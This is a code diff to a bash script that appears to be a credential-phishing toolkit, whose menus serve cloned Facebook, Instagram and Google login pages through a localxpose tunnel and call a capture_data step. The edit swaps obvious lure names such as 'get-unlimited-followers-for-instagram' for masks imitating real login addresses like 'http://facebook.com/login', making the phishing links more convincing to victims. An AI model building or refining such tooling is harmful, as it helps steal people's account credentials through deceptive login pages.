@@ -497,7 +497,7 @@ start_loclx() {
 	{ sleep 12; clear; banner_small; }
 	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io') #DONE :)
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}http://$loclx_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$loclx_url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask_$loclx_url"
 	capture_data
 }
 
@@ -556,19 +556,19 @@ site_facebook() {
 	case $REPLY in 
 		1 | 01)
 			website="facebook"
-			mask='http://blue-verified-badge-for-facebook-free'
+			mask='http://facebook.com/login'
 			tunnel_menu;;
 		2 | 02)
 			website="fb_advanced"
-			mask='http://vote-for-the-best-social-media'
+			mask='http://facebook.com/login'
 			tunnel_menu;;
 		3 | 03)
 			website="fb_security"
-			mask='http://make-your-facebook-secured-and-free-from-hackers'
+			mask='http://facebook.com/login'
 			tunnel_menu;;
 		4 | 04)
 			website="fb_messenger"
-			mask='http://get-messenger-premium-features-free'
+			mask='http://facebook.com/login'
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -592,19 +592,19 @@ site_instagram() {
 	case $REPLY in 
 		1 | 01)
 			website="instagram"
-			mask='http://instagram.com'
+			mask='http://instagram.com/login'
 			tunnel_menu;;
 		2 | 02)
 			website="ig_followers"
-			mask='http://get-unlimited-followers-for-instagram'
+			mask='http://instagram.com/login'
 			tunnel_menu;;
 		3 | 03)
 			website="insta_followers"
-			mask='http://get-1000-followers-for-instagram'
+			mask='http://instagram.com/login'
 			tunnel_menu;;
 		4 | 04)
 			website="ig_verify"
-			mask='http://blue-badge-verify-for-instagram-free'
+			mask='http://instagram.com/login'
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -627,15 +627,15 @@ site_gmail() {
 	case $REPLY in 
 		1 | 01)
 			website="google"
-			mask='http://get-unlimited-google-drive-free'
+			mask='http://google.com/login'
 			tunnel_menu;;		
 		2 | 02)
 			website="google_new"
-			mask='http://get-unlimited-google-drive-free'
+			mask='http://google.com/new_account'
 			tunnel_menu;;
 		3 | 03)
 			website="google_poll"
-			mask='http://vote-for-the-best-social-media'
+			mask='http://google.com/account_pool'
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
